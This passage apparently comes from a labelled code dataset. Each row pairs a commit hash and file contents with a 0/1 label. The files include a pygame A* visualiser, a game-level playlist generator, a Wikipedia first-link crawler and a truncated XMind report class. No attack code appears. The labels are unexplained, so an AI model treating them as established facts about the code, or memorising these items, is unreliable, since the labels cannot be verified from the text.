from visual_node import GraphVisual
import time

def main():
#Vector2(17, 17)      For center of square
    pygame.init()
    screen_width = 1360
    screen_height = 760
    screen = pygame.display.set_mode((screen_width, screen_height))
    screen.fill((0, 0, 0))
    grid = Graph(27, 19)
    visual_graph = GraphVisual(grid, 40, screen)
    start_square = pygame.rect.Rect(3, 363, 36, 36)
    goal_square = pygame.rect.Rect(1323, 363, 36, 36)
    start_node = Node(Vector2(0, 9))
    goal_node = Node(Vector2(33, 9))
    astar = AStar(grid, start_node, goal_node)
    animate_path = []
    drawn_path = []
    path = []
    iterator = 0
    iterator_two = 1

    dragging_start = False
    dragging_goal = False
    mouse_is_down = False
    pressed_enter = False
    
    while True:
        screen.fill((0, 0, 0))
        visual_graph = GraphVisual(grid, 40, screen)
#        goal_node = Node(Vector2(goal_square.left, goal_square.top))

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return

        pygame.event.pump()
        if event.type == pygame.MOUSEBUTTONDOWN:
            pressed_enter = False
            del path[:]
            if event.button == 1:
                if start_square.collidepoint(event.pos):
                    dragging_start = True
                    mouse_x, mouse_y = event.pos
                    offset_x = start_square.x - mouse_x
                    offset_y = start_square.y - mouse_y
                elif goal_square.collidepoint(event.pos):
                    dragging_goal = True
                    mouse_x, mouse_y = event.pos
                    offset_x = goal_square.x - mouse_x
                    offset_y = goal_square.y - mouse_y
                else:
                    count = 0
                    for node in visual_graph.node_visual_colliders:
                        if node.collidepoint(event.pos) and mouse_is_down is False:
                            current_state = grid.nodes[count].is_traversable
                            grid.nodes[count].toggle_state(""wall"")
                            mouse_is_down = True
                        count += 1
        elif event.type == pygame.MOUSEBUTTONUP:
            mouse_is_down = False
            if event.button == 1:
                count = 0
                if dragging_start is True or dragging_goal is True:
                    for collider in visual_graph.node_visual_colliders:
                        if start_square.colliderect(collider):
                            start_square.left = visual_graph.node_visual_colliders[count].left
                            start_square.top = visual_graph.node_visual_colliders[count].top
                            dragging_start = False
                            start_node = Node(Vector2(visual_graph.node_visuals[count].node.get_x(), visual_graph.node_visuals[count].node.get_y()))
                        if goal_square.colliderect(collider):
                            goal_square.left = visual_graph.node_visual_colliders[count].left
                            goal_square.top = visual_graph.node_visual_colliders[count].top
                            dragging_goal = False
                            goal_node = Node(Vector2(visual_graph.node_visuals[count].node.get_x(), visual_graph.node_visuals[count].node.get_y()))
                        count += 1
                    astar = AStar(grid, start_node, goal_node)
        elif event.type == pygame.MOUSEMOTION:
            if dragging_start:
                mouse_x, mouse_y = event.pos
                start_square.x = mouse_x + offset_x
                start_square.y = mouse_y + offset_y
            elif dragging_goal:
                mouse_x, mouse_y = event.pos
                goal_square.x = mouse_x + offset_x
                goal_square.y = mouse_y + offset_y
            elif mouse_is_down:
                count = 0
                for node in visual_graph.node_visual_colliders:
                    if node.collidepoint(event.pos) and grid.nodes[count].is_traversable is current_state:
                        grid.nodes[count].toggle_state(""wall"")
                    count += 1
        
        if pygame.key.get_pressed()[pygame.K_c]:
            for x in range(0, grid.length * grid.height):
                if grid.nodes[x].is_traversable is False:
                    grid.nodes[x].toggle_state(""wall"")
                    path = astar.find_path()
                pressed_enter = False
                
        if pygame.key.get_pressed()[pygame.K_RETURN]:
            pressed_enter = True
            if not path:
                path = astar.find_path()
            else:
                astar = AStar(grid, start_node, goal_node)
                path = astar.find_path()

        if pressed_enter:
            time.sleep(.05)
            count = 0
            count_two = 1
            if iterator_two <= len(path) - 1:
                line_start = Vector2(path[iterator].get_x() * 40, path[iterator].get_y() * 40)
                line_end = Vector2(path[iterator_two].get_x() * 40, path[iterator_two].get_y() * 40)
                animate_path.append(Line(screen, (255, 255, 0), Vector2(line_start.x_pos + 20,
                                                                    line_start.y_pos + 20),
                                       Vector2(line_end.x_pos + 20,
                                               line_end.y_pos + 20), 5))
            while count_two <= len(animate_path):
                line_start = Vector2(path[count].get_x() * 40, path[count].get_y() * 40)
                line_end = Vector2(path[count_two].get_x() * 40, path[count_two].get_y() * 40)
                drawn_path.append(Line(screen, (255, 255, 0), Vector2(line_start.x_pos + 20,
                                       line_start.y_pos + 20), Vector2(line_end.x_pos + 20,
                                       line_end.y_pos + 20), 5))
                count += 1
                count_two += 1
            iterator += 1
            iterator_two += 1
        else:
            iterator = 0
            iterator_two = 1
            del animate_path[:]
            del drawn_path[:]

        count = 0
        for node in grid.nodes:
            if node.is_traversable is False:
                pygame.draw.rect(screen, (0, 0, 0), visual_graph.node_visual_colliders[count])
            count += 1
        pygame.draw.rect(screen, (0, 255, 0), start_square)
        pygame.draw.rect(screen, (255, 0, 0), goal_square)
        pygame.display.flip()

main()
/n/n/n",0
209,686df24fde8a6de347f9b3c95ad5e2a6679de358,"/draw.py/n/n#pylint: disable = E1101
import pygame
from draw_utils import Rectangle
from draw_utils import Circle
from draw_utils import Line
from vector2 import Vector2
from a_star import AStar
from graph import Graph
from node import Node
from visual_node import GraphVisual

def main():
#Vector2(17, 17)      For center of square
    pygame.init()
    screen_width = 1360
    screen_height = 760
    screen = pygame.display.set_mode((screen_width, screen_height))
    screen.fill((0, 0, 0))
    grid = Graph(34, 19)
    visual_graph = GraphVisual(grid, 40, screen)
    start_square = pygame.rect.Rect(3, 363, 36, 36)
    goal_square = pygame.rect.Rect(1323, 363, 36, 36)
    start_node = Node(Vector2(0, 9))
    goal_node = Node(Vector2(33, 9))
    astar = AStar(grid, start_node, goal_node)
    drawn_path = []
    path = []

    dragging_start = False
    dragging_goal = False
    mouse_is_down = False
    pressed_enter = False
    
    while True:
        screen.fill((0, 0, 0))
        visual_graph = GraphVisual(grid, 40, screen)
#        goal_node = Node(Vector2(goal_square.left, goal_square.top))

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return

        pygame.event.pump()
        if event.type == pygame.MOUSEBUTTONDOWN:
            pressed_enter = False
            del path[:]
            if event.button == 1:
                if start_square.collidepoint(event.pos):
                    dragging_start = True
                    mouse_x, mouse_y = event.pos
                    offset_x = start_square.x - mouse_x
                    offset_y = start_square.y - mouse_y
                elif goal_square.collidepoint(event.pos):
                    dragging_goal = True
                    mouse_x, mouse_y = event.pos
                    offset_x = goal_square.x - mouse_x
                    offset_y = goal_square.y - mouse_y
                else:
                    count = 0
                    for node in visual_graph.node_visual_colliders:
                        if node.collidepoint(event.pos) and mouse_is_down is False:
                            current_state = grid.nodes[count].is_traversable
                            mouse_is_down = True
                        count += 1
        elif event.type == pygame.MOUSEBUTTONUP:
            mouse_is_down = False
            if event.button == 1:
                count = 0
                if dragging_start is True or dragging_goal is True:
                    for collider in visual_graph.node_visual_colliders:
                        if start_square.colliderect(collider):
                            start_square.left = visual_graph.node_visual_colliders[count].left
                            start_square.top = visual_graph.node_visual_colliders[count].top
                            dragging_start = False
                            start_node = Node(Vector2(visual_graph.node_visuals[count].node.get_x(), visual_graph.node_visuals[count].node.get_y()))
                        if goal_square.colliderect(collider):
                            goal_square.left = visual_graph.node_visual_colliders[count].left
                            goal_square.top = visual_graph.node_visual_colliders[count].top
                            dragging_goal = False
                            goal_node = Node(Vector2(visual_graph.node_visuals[count].node.get_x(), visual_graph.node_visuals[count].node.get_y()))
                        count += 1
                    astar = AStar(grid, start_node, goal_node)
        elif event.type == pygame.MOUSEMOTION:
            if dragging_start:
                mouse_x, mouse_y = event.pos
                start_square.x = mouse_x + offset_x
                start_square.y = mouse_y + offset_y
            elif dragging_goal:
                mouse_x, mouse_y = event.pos
                goal_square.x = mouse_x + offset_x
                goal_square.y = mouse_y + offset_y
            elif mouse_is_down:
                count = 0
                for node in visual_graph.node_visual_colliders:
                    if node.collidepoint(event.pos) and grid.nodes[count].is_traversable is current_state:
                        grid.nodes[count].toggle_state(""wall"")
                    count += 1
                
                
        if pygame.key.get_pressed()[pygame.K_RETURN]:
            pressed_enter = True
            if not path:
                path = astar.find_path()
            else:
                astar = AStar(grid, start_node, goal_node)
                path = astar.find_path()

        if pressed_enter:
            count = 0
            count_two = 1
            while count_two <= len(path) - 1:
                line_start = Vector2(path[count].get_x() * 40, path[count].get_y() * 40)
                line_end = Vector2(path[count_two].get_x() * 40, path[count_two].get_y() * 40)
                drawn_path.append(Line(screen, (0, 0, 255), Vector2(line_start.x_pos + 20,
                                       line_start.y_pos + 20), Vector2(line_end.x_pos + 20,
                                       line_end.y_pos + 20), 5))
                count += 1
                count_two += 1

        pygame.draw.rect(screen, (0, 255, 0), start_square)
        pygame.draw.rect(screen, (255, 0, 0), goal_square)
        count = 0
        for node in grid.nodes:
            if node.is_traversable is False:
                pygame.draw.rect(screen, (0, 0, 0), visual_graph.node_visual_colliders[count])
            count += 1
        pygame.display.flip()

main()
/n/n/n",1
210,24eea577585536c636ee418f030570d33dc84fa8,"setlist.py/n/nimport os
import sys
import time
import random
import cPickle as pickle
from multiprocessing import Pool
from sh import find
from util import load_level
from parser_common import UnknownFileHeader


# Generate a new UUID to invalidate an old level database.
DATABASE_VERSION = ""37590c47-f652-4cb8-864e-db18c0e5e5e7""


def process_level(path):
    if not os.path.isfile(path):
        return None

    try:
        level = load_level(path, fast_mode = True)
    except UnknownFileHeader:
        return None

    edges = None
    doors = []
    north, east, south, west = None, None, None, None
    for link in level.links:
        x, y, w, h = link.area
        if w > 60:
            if y == 0:
                north = link.target
            elif y == 63:
                south = link.target
        elif h > 60:
            if x == 0:
                west = link.target
            elif x == 63:
                east = link.target
        else:
            doors.append(link.target)
    
    if north or east or south or west:
        edges = (north, east, south, west)

    return {
        ""level_hash"" : level.level_hash(),
        ""pallet_hash"" : level.pallet_hash(),
        ""path"" : path,
        ""doors"" : doors,
        ""edges"" : edges,
        ""signs"" : len(level.signs),
        ""actors"" : len(level.actors),
        ""baddies"" : len(level.baddies),
        ""treasures"" : len(level.treasures),
    }


def build_level_database(input_path):
    print ""Generating or regenerating level database.""
    print ""This may take a long time if a lot of files need to be scanned.""
    paths = [p.strip() for p in find(input_path)]

    levels = []
    pool = Pool(processes=4)

    ratio = 100.0 / len(paths)
    processed = 0
    last_percent = 0
    for data in pool.imap_unordered(process_level, paths):
        processed += 1
        percent = int(processed * ratio)
        if percent > last_percent:
            last_percent = percent
            print ""... {}%"".format(percent)
        
        if not data:
            continue
        levels.append(data)

    db = {
        ""levels"" : levels,
        ""version"" : DATABASE_VERSION,
    }

    with open(""level_db.pickle"", ""w"") as outfile:
        pickle.dump(db, outfile)


def load_level_database():
    db = None
    failed = False
    try:
        with open(""level_db.pickle"", ""r"") as infile:
            db = pickle.load(infile)
            if db[""version""] != DATABASE_VERSION:
                failed = True
                print ""Level database needs to be regenerated!""
    except IOError:
        failed = True
        print ""No level database found!""
    if failed:
        print """"""
Re-run this script with the argument ""--scan"" followed by a path to
a folder containing all of the levels you wish to scan.
"""""".strip()
        exit(1)
    return db


def load_corpus():
    db = load_level_database()
    def sort_fn(level):
        return level[""level_hash""] + "":"" + level[""path""]

    boring = []
    duplicates = {}
    by_hash = {}
    by_path = {}
    for level in sorted(db[""levels""], key=sort_fn):
        short_path = os.path.split(level[""path""])[-1]
        level_hash = level[""level_hash""]
        by_path[short_path] = level

        things = level[""signs""] + \
                 level[""actors""] + \
                 level[""baddies""] + \
                 level[""treasures""]
        if things == 0:
            # TODO : Check the pallet hash to see if the level is
            # likely ""boring"" since it doesn't have anything else in
            # it.  If it is boring, we should still include it in the
            # by_path list, but not in by_hash.
            pass
        
        if by_hash.has_key(level_hash):
            if not duplicates.has_key(level_hash):
                duplicates[level_hash] = []
            duplicates[level_hash].append(level)
        else:
            by_hash[level_hash] = level
        
    return boring, duplicates, by_hash, by_path
    


def generate_setlist(output_path):
    print ""Generating level playlist...""

    boring, duplicates, by_hash, by_path = load_corpus()

    visited = []
    paths_written = []
    unprocessed = by_hash.keys()
    queue = []

    quad_count = 0
    pair_count = 0
    ungrouped_count = 0

    def find(key):
        # accepts either the level name or hash
        if key is None:
            return None
        assert(type(key) == str)
        found = None
        if by_path.has_key(key):
            found = by_path[key]
        elif by_hash.has_key(key):
            found = by_hash[key]
        if found and found[""level_hash""] not in visited:
            return found
        return None

    def take_level(setlist, level):
        level_hash = level[""level_hash""]
        visited.append(level_hash)
        try:
            queue.remove(level_hash)
        except:
            pass
        try:
            unprocessed.remove(level_hash)
        except:
            pass
        assert(level[""path""] not in paths_written)
        paths_written.append(level[""path""])
        setlist.write(level[""path""] + ""\n"")

    def enqueue(hash_or_path):
        level = find(hash_or_path)
        if level:
            level_hash = level[""level_hash""]
            try:
                unprocessed.remove(level_hash)
            except:
                pass
            if level_hash not in queue and level_hash not in visited:
                queue.append(level_hash)
        
    def edge_search(level):
        # this attempts to find near by levels to group together

        if not level[""edges""]:
            return None

        left_of = find(level[""edges""][1])
        right_of = find(level[""edges""][3])

        if not left_of or right_of:
            return None

        east = left_of if left_of else level
        west = level if left_of else right_of
        ne_level, nw_level, se_level, sw_level = None, None, None, None

        if east[""edges""][2] and west[""edges""][2]:
            ne_level, nw_level = east, west
            se_level = find(east[""edges""][2])
            sw_level = find(west[""edges""][2])

        elif east[""edges""][0] and west[""edges""][0]:
            se_level, sw_level = east, west
            ne_level = find(east[""edges""][0])
            nw_level = find(west[""edges""][0])

        if ne_level and nw_level and se_level and sw_level:
            return (ne_level, nw_level, se_level, sw_level)
        
        else:
            return (east, west)

    with open(output_path, ""w"") as setlist:
        while len(unprocessed) + len(queue) > 0:
            pick = None
            if len(queue):
                pick = queue.pop(0)
            else:
                pick = unprocessed.pop(0)

            level = find(pick)
            assert(level is not None)
            
            edges = []
            edge_odds = 0.30
            adjacent_group = edge_search(level)
            if adjacent_group:
                if len(adjacent_group) == 2:
                    pair_count += 1
                    setlist.write(""*** pair ***\n"")
                    edge_odds = 0.20
                elif len(adjacent_group) == 4:
                    quad_count += 1
                    setlist.write(""*** quad ***\n"")
                    edge_odds = 0.10
                for tile in adjacent_group:
                    take_level(setlist, tile)
                    edges += tile[""edges""]
            else:
                ungrouped_count += 1
                edges = level[""edges""] or []
                take_level(setlist, level)

            if level[""doors""]:
                # add all levels linked by doors into the queue
                for target in level[""doors""]:
                    enqueue(target)

            # small chance of adding neighbors into the queue
            for edge_path in set(edges):
                if random.random() <= edge_odds:
                    enqueue(edge_path)

    print ""quads found:"", quad_count
    print ""pairs found:"", pair_count
    print ""individuals:"", ungrouped_count
    print ""total tweets:"", quad_count + pair_count + ungrouped_count
    print ""total levels:"", quad_count * 4 + pair_count * 2 + ungrouped_count


if __name__ == ""__main__"":
    random.seed(12345)
    start = time.time()
    if len(sys.argv) > 1 and sys.argv[1] == ""--scan"":
        assert(len(sys.argv) == 3)
        build_level_database(sys.argv[2])
    else:
        output_path = sys.argv[1] if len(sys.argv) > 1 else ""playlist.txt""
        generate_setlist(output_path)
    elapsed = time.time() - start
    print ""Process complete.""
    if elapsed > 60:
        print ""Elapsed time in minutes:"", elapsed / 60.0
    else:
        print ""Elapsed time in seconds:"", elapsed
/n/n/n",0
211,24eea577585536c636ee418f030570d33dc84fa8,"/setlist.py/n/nimport os
import sys
import time
import random
import cPickle as pickle
from multiprocessing import Pool
from sh import find
from util import load_level
from parser_common import UnknownFileHeader


# Generate a new UUID to invalidate an old level database.
DATABASE_VERSION = ""37590c47-f652-4cb8-864e-db18c0e5e5e7""


def process_level(path):
    if not os.path.isfile(path):
        return None

    try:
        level = load_level(path, fast_mode = True)
    except UnknownFileHeader:
        return None

    edges = None
    doors = []
    north, east, south, west = None, None, None, None
    for link in level.links:
        x, y, w, h = link.area
        if w > 60:
            if y == 0:
                north = link.target
            elif y == 63:
                south = link.target
        elif h > 60:
            if x == 0:
                west = link.target
            elif x == 63:
                east = link.target
        else:
            doors.append(link.target)
    
    if north or east or south or west:
        edges = (north, east, south, west)

    return {
        ""level_hash"" : level.level_hash(),
        ""pallet_hash"" : level.pallet_hash(),
        ""path"" : path,
        ""doors"" : doors,
        ""edges"" : edges,
        ""signs"" : len(level.signs),
        ""actors"" : len(level.actors),
        ""baddies"" : len(level.baddies),
        ""treasures"" : len(level.treasures),
    }


def build_level_database(input_path):
    print ""Generating or regenerating level database.""
    print ""This may take a long time if a lot of files need to be scanned.""
    paths = [p.strip() for p in find(input_path)]

    levels = []
    pool = Pool(processes=4)

    ratio = 100.0 / len(paths)
    processed = 0
    last_percent = 0
    for data in pool.imap_unordered(process_level, paths):
        processed += 1
        percent = int(processed * ratio)
        if percent > last_percent:
            last_percent = percent
            print ""... {}%"".format(percent)
        
        if not data:
            continue
        levels.append(data)

    db = {
        ""levels"" : levels,
        ""version"" : DATABASE_VERSION,
    }

    with open(""level_db.pickle"", ""w"") as outfile:
        pickle.dump(db, outfile)


def load_level_database():
    db = None
    failed = False
    try:
        with open(""level_db.pickle"", ""r"") as infile:
            db = pickle.load(infile)
            if db[""version""] != DATABASE_VERSION:
                failed = True
                print ""Level database needs to be regenerated!""
    except IOError:
        failed = True
        print ""No level database found!""
    if failed:
        print """"""
Re-run this script with the argument ""--scan"" followed by a path to
a folder containing all of the levels you wish to scan.
"""""".strip()
        exit(1)
    return db


def load_corpus():
    db = load_level_database()
    def sort_fn(level):
        return level[""level_hash""] + "":"" + level[""path""]

    boring = []
    duplicates = []
    by_hash = {}
    by_path = {}
    for level in sorted(db[""levels""], key=sort_fn):
        short_path = os.path.split(level[""path""])[-1]
        level_hash = level[""level_hash""]
        if by_hash.has_key(level_hash):
            # we'll use this path as an alias to the other level in
            # case anything links to it
            other = by_hash[level_hash]
            by_path[short_path] = other
            duplicates.append(level)
            continue

        things = level[""signs""] + \
                 level[""actors""] + \
                 level[""baddies""] + \
                 level[""treasures""]
        if things == 0:
            # check to see if the pallet is ""boring"" and possibly skip
            # the level since it doesn't really have anything in it
            pass

        by_hash[level_hash] = level
        by_path[short_path] = level
        
    return boring, duplicates, by_hash, by_path
    


def generate_setlist(output_path):
    print ""Generating level playlist...""

    boring, duplicates, by_hash, by_path = load_corpus()

    unprocessed = by_hash.keys()
    queue = []

    quad_count = 0
    pair_count = 0
    ungrouped_count = 0

    def find(key):
        # accepts either level hash or path part
        if by_path.has_key(key):
            key = by_path[key][""level_hash""]
        if by_hash.has_key(key):
            try:
                return unprocessed.index(key), by_hash[key]
            except ValueError:
                pass
        return -1, None

    def edge_search(level):
        # this attempts to find near by levels to group together

        if not level[""edges""]:
            return None

        left_of = find(level[""edges""][1])[1]
        right_of = find(level[""edges""][3])[1]

        if not left_of or right_of:
            return None

        east = left_of if left_of else level
        west = level if left_of else right_of
        ne_level, nw_level, se_level, sw_level = None, None, None, None

        # FIXME if we selecte a duplicate alias in the east/west pair,
        # then the quad will be bogus, because the links will line up
        # wrong.

        if east[""edges""][2] and west[""edges""][2]:
            ne_level, nw_level = east, west
            se_level = find(east[""edges""][2])[1]
            sw_level = find(west[""edges""][2])[1]

        elif east[""edges""][0] and west[""edges""][0]:
            se_level, sw_level = east, west
            ne_level = find(east[""edges""][0])[1]
            nw_level = find(west[""edges""][0])[1]

        if ne_level and nw_level and se_level and sw_level:
            return (ne_level, nw_level, se_level, sw_level)
        
        else:
            return (east, west)
        

    with open(output_path, ""w"") as setlist:
        while len(unprocessed) + len(queue) > 0:
            pick = None
            if len(queue):
                pick = queue.pop(0)
            else:
                pick = unprocessed.pop(0)
            level = by_hash[pick]

            edges = []
            edge_odds = 0.30
            adjacent_group = edge_search(level)
            if adjacent_group:
                if len(adjacent_group) == 2:
                    pair_count += 1
                    setlist.write(""*** pair ***\n"")
                    edge_odds = 0.20
                elif len(adjacent_group) == 4:
                    quad_count += 1
                    setlist.write(""*** quad ***\n"")
                    edge_odds = 0.10
                for tile in adjacent_group:
                    corrupted = False # HACK
                    if not tile is level:
                        try:
                            index = unprocessed.index(tile[""level_hash""])
                            unprocessed.pop(index)
                        except:
                            corrupted = True # HACK 
                    setlist.write(tile[""path""] + ""\n"")
                    edges += tile[""edges""]
                if corrupted: # HACK
                    print ""(known bug) quad is likely wrong because of duplicate aliasing:""
                    for tile in adjacent_group:
                        print "" ***"", tile[""path""] 
            else:
                ungrouped_count += 1
                edges = level[""edges""]
                setlist.write(level[""path""] + ""\n"")

            if level[""doors""]:
                # add all levels linked by doors into the queue
                for target in level[""doors""]:
                    index, found = find(target)
                    if found:
                        queue.append(unprocessed.pop(index))

            # small chance of adding neighbors into the queue
            if edges:
                for edge_path in edges:
                    if edge_path:
                        edge_index, edge_level = find(edge_path)
                        if edge_level and random.random() < edge_odds:
                            queue.append(unprocessed.pop(edge_index))

    if boring:
        print ""Skipped \""boring\"" levels:""
        for level in boring:
            print "" -"", level[""path""]
    if duplicates:
        print ""Skipped non-unique levels:""
        for level in duplicates:
            print "" -"", level[""path""]

    print ""quads found:"", quad_count
    print ""pairs found:"", pair_count
    print ""individuals:"", ungrouped_count
    print ""total tweets:"", quad_count + pair_count + ungrouped_count
    print ""total levels:"", quad_count * 4 + pair_count * 2 + ungrouped_count


if __name__ == ""__main__"":
    random.seed(12345)
    start = time.time()
    if len(sys.argv) > 1 and sys.argv[1] == ""--scan"":
        assert(len(sys.argv) == 3)
        build_level_database(sys.argv[2])
    else:
        output_path = sys.argv[1] if len(sys.argv) > 1 else ""playlist.txt""
        generate_setlist(output_path)
    elapsed = time.time() - start
    print ""Process complete.""
    if elapsed > 60:
        print ""Elapsed time in minutes:"", elapsed / 60.0
    else:
        print ""Elapsed time in seconds:"", elapsed
/n/n/n",1
212,8298cd1911c4c3e082dcfef68e36b4f50b72e079,"wiki_crawler.py/n/nfrom bs4 import BeautifulSoup
from bs4.element import NavigableString, Tag
import requests
import time


class WikiCrawler:
    def __init__(self, wiki):
        self.MAX_P_CHECKS = 5
        self.MAX_CRAWLS = 1
        self.MAX_PATH_LENGTH = 50
        self.TARGET = ""Philosophy""
        self.DOMAIN = ""https://en.wikipedia.org""
        self.start_wiki = ""Special:Random"" if not wiki else wiki
        self.path_lengths = []
        self.wiki_to_target_length = {}
        self.completed_path = 0
        self.invalid_path = 0

    def build_url(self, wiki_topic, add_wiki_text):
        if add_wiki_text:
            url = self.DOMAIN + '/wiki/' + wiki_topic
        else:
            url = self.DOMAIN + wiki_topic
        return url

    def parse_tag(self, tag):
        next_wiki = None
        contents = tag.contents
        stack = []
        for element in contents:
            # Keeps track of balanced parenthesis to
            # ensure no links that are within them
            # are used. Since closing parenthesis
            # may be within the same string, pop
            # must be checked immediately
            if isinstance(element, NavigableString):
                if '(' in element:
                    stack.append('(')
                if ')' in element:
                    stack.pop()
            # Checks to see if the stack is empty
            # meaning now outside of the parenthesis
            # and can check if a link
            if isinstance(element, Tag) and not stack:
                a_tag = element
                if not getattr(element, 'name', None) == 'a':
                    a_tag = element.find('a', not {'class': 'mw-selflink'})
                if self.is_valid(a_tag):
                    return a_tag.attrs['href']
        return next_wiki

    def parse_html(self, div):
        # Likely to find the first link in paragraphs. A limit
        # is placed on the number of paragraphs to check since
        # it's also likley the link is in the initial paragraphs.
        p_tags = div.find_all('p', not {'class': 'mw-empty-elt'},
                              recursive=False, limit=self.MAX_P_CHECKS)
        for p in p_tags:
            next_wiki = self.parse_tag(p)
            if next_wiki:
                return next_wiki

        # To handle cases that the link may not be in a paragraph
        # but in bullets
        ul = div.find('ul', recursive=False)
        next_wiki = self.parse_tag(ul)

        return next_wiki

    def process_path(self, path, wiki_topic):
        length = len(path)
        if not wiki_topic:
            for i, wiki in enumerate(path):
                self.wiki_to_target_length[wiki] = length - i - 1
        else:
            to_target = self.wiki_to_target_length[wiki_topic]
            for i, wiki in enumerate(path):
                self.wiki_to_target_length[wiki] = length - i + to_target - 1

    def crawler(self):

        cycle_check = set()
        path = []
        path_length = 0
        print(""\nStart"")
        url = self.build_url(self.start_wiki, True)
        session = requests.Session()

        while path_length < self.MAX_PATH_LENGTH:

            html = session.get(url)
            soup = BeautifulSoup(html.content, 'lxml')

            title = soup.find('h1', {""id"": ""firstHeading""})
            wiki_topic = url.split(""/wiki/"")[1]
            print(title.get_text())

            # If this is true, then a unique path to target has
            # been found
            if title.getText() == self.TARGET:
                self.process_path(path, None)
                self.path_lengths.append(path_length)
                print(path_length)
                return True

            # otherwise if the current wiki is known to be on a path
            # to target, then stop iterating
            if wiki_topic in self.wiki_to_target_length:
                self.process_path(path, wiki_topic)
                path_length += self.wiki_to_target_length[wiki_topic]
                self.path_lengths.append(path_length)
                print(path_length)
                return True

            div = soup.find('div', {'class': 'mw-parser-output'})
            next_wiki = self.parse_html(div)

            # Might lead to a dead end (no links to follow) or
            # a cycle (first eventually links back to a wiki
            # page already visited
            if not next_wiki or next_wiki in cycle_check:
                return False

            cycle_check.add(next_wiki)
            wiki_topic = next_wiki.split(""/wiki/"")[1]
            path.append(wiki_topic)

            if next_wiki[0] == '/':
                url = self.build_url(next_wiki, False)

            path_length += 1
            time.sleep(1)

        return False

    # Iterates over crawler for the max number of crawls
    # while not taking into account invalid paths - dead ends
    # or cycles
    def crawl(self):
        while self.completed_path < self.MAX_CRAWLS:
            if self.crawler():
                self.completed_path += 1
            else:
                self.invalid_path += 1
            print()
        print(f'Completed paths: {self.completed_path}')
        print(f'Invalid paths: {self.invalid_path}')

    @staticmethod
    def is_valid(element):
        tags = ['sup', 'i', 'span']
        return getattr(element, 'name', None) == 'a' \
               and getattr(element.parent, 'name', None) not in tags \
               and not element.has_attr('style')


if __name__ == '__main__':
    wiki = None
    crawler = WikiCrawler(wiki)
    crawler.crawl()
/n/n/n",0
213,8298cd1911c4c3e082dcfef68e36b4f50b72e079,"/wiki_crawler.py/n/nfrom bs4 import BeautifulSoup
from bs4.element import NavigableString, Tag
import requests
import time


class WikiCrawler:
    def __init__(self, wiki):
        self.MAX_P_CHECKS = 5
        self.MAX_CRAWLS = 1
        self.MAX_PATH_LENGTH = 50
        self.TARGET = ""Philosophy""
        self.DOMAIN = ""https://en.wikipedia.org""
        self.start_wiki = ""Special:Random"" if not wiki else wiki
        self.path_lengths = []
        self.wiki_to_target_length = {}
        self.completed_path = 0
        self.invalid_path = 0

    def build_url(self, wiki_topic, add_wiki_text):
        if add_wiki_text:
            url = self.DOMAIN + '/wiki/' + wiki_topic
        else:
            url = self.DOMAIN + wiki_topic
        return url

    def parse_tag(self, tag):
        next_wiki = None
        contents = tag.contents
        stack = []
        for element in contents:
            # Keeps track of balanced parenthesis to
            # ensure no links that are within them
            # are used. Since closing parenthesis
            # may be within the same string, pop
            # must be checked immediately
            if isinstance(element, NavigableString):
                if '(' in element:
                    stack.append('(')
                if ')' in element:
                    stack.pop()
            # Checks to see if the stack is empty
            # meaning now outside of the parenthesis
            # and can check if a link
            if isinstance(element, Tag) and not stack:
                a_tag = element
                if not getattr(element, 'name', None) == 'a':
                    a_tag = element.find('a')
                if self.is_valid(a_tag):
                    return a_tag.attrs['href']
        return next_wiki

    def parse_html(self, div):
        # Likely to find the first link in paragraphs. A limit
        # is placed on the number of paragraphs to check since
        # it's also likley the link is in the initial paragraphs.
        p_tags = div.find_all('p', not {'class': 'mw-empty-elt'},
                              recursive=False, limit=self.MAX_P_CHECKS)
        for p in p_tags:
            next_wiki = self.parse_tag(p)
            if next_wiki:
                return next_wiki

        # To handle cases that the link may not be in a paragraph
        # but in bullets
        ul = div.find('ul', recursive=False)
        next_wiki = self.parse_tag(ul)

        return next_wiki

    def crawler(self):

        cycle_check = set()
        path = []
        path_length = 0
        print(""\nStart"")
        url = self.build_url(self.start_wiki, True)
        session = requests.Session()

        while path_length < self.MAX_PATH_LENGTH:

            html = session.get(url)
            soup = BeautifulSoup(html.content, 'lxml')

            title = soup.find('h1', {""id"": ""firstHeading""})
            wiki_topic = url.split(""/wiki/"")[1]
            print(title.getText())

            if title.getText() == self.TARGET:
                self.path_lengths.append(path_length)
                return True

            div = soup.find('div', {'class': 'mw-parser-output'})
            wiki = self.parse_html(div)

            # Might lead to a dead end (no links to follow) or
            # a cycle (first eventually links back to a wiki
            # page already visited
            if not wiki or wiki in cycle_check:
                self.invalid_path += 1
                return False

            cycle_check.add(wiki)
            wiki_topic = wiki.split(""/wiki/"")[1]
            path.append(wiki_topic)
            url = self.build_url(wiki, False)
            path_length += 1

            time.sleep(1)

        return False

    # Iterates over crawler for the max number of crawls
    # while not taking into account invalid paths - dead ends
    # or cycles
    def crawl(self):
        while self.completed_path < self.MAX_CRAWLS:
            if self.crawler():
                self.completed_path += 1
            else:
                self.invalid_path += 1
            print()

    @staticmethod
    def is_valid(element):
        tags = ['sup', 'i', 'span']
        return getattr(element, 'name', None) == 'a' \
               and getattr(element.parent, 'name', None) not in tags \
               and not element.has_attr('style')


if __name__ == '__main__':
    wiki = ""Art""
    crawler = WikiCrawler(wiki)
    crawler.crawl()
/n/n/n",1
214,02256eedb8fecc60376f35d2f772e9bc275c5574,"ApkXmind.py/n/nimport xmind
from xmind.core import workbook,saver
from xmind.core.topic import TopicElement
from Configuration import *
from datetime import datetime
import time

class ApkXmind:

    app = """"
    workbook = """"
    sheet = """"
    configuration = Configuration()

    def __init__(self ,app):
        versionAlreadyExists = False
        self.app = app
        cwd = os.path.dirname(os.path.realpath(__file__))+""/output_xmind/""
        self.workbook = xmind.load(cwd+app.getPackageName( ) +"".xmind"")
	print ""[-]Generating Xmind""
        if len(self.workbook.getSheets()) == 1:
            if self.workbook.getPrimarySheet().getTitle() == None:
                self.sheet = self.workbook.getPrimarySheet()
                self.sheet.setTitle(app.getVersionCode())
            else:
                self.sheet = self.workbook.createSheet()
                self.sheet.setTitle(app.getVersionCode())
                self.workbook.addSheet(self.sheet)
        else:
            self.sheet = self.workbook.createSheet()
            self.sheet.setTitle(app.getVersionCode())
            self.workbook.addSheet(self.sheet)
        rootTopic =self.sheet.getRootTopic()
        rootTopic.setTitle(app.getPackageName())
        rootTopic.setTopicStructure(self.configuration.geXmindTopicStructure())
        self.createTopics()
        self.save()

    def getRootTopic(self):
        return self.sheet.getRootTopic()

    def createTopics(self):


